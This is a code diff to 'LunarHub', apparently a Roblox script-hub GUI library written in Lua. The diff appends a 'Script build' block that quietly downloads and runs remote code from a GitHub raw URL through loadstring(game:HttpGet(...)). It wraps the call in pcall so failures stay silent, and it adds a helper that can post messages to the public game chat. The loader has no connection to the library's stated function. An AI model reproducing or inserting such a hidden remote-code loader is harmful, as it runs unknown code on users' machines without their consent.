@@ -218,4 +218,32 @@ function LunarHub:AddTab(name, order)
     return tab
 end
 
+-- Script build:
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+
+local Wait = task.wait
+
+
+function notify(title, text, duration)
+    game:GetService("StarterGui"):SetCore("ChatNotification", {
+        Title = title,
+        Text = text,
+        Duration = duration or 5
+    })
+end
+
+local function Chat(message)
+  
+  game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(message)
+end
+
+pcall(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Something478/DevTools/main/Tag"))()
+end)
+
+
+
 return G2L["ScreenGui_1"], LunarHub
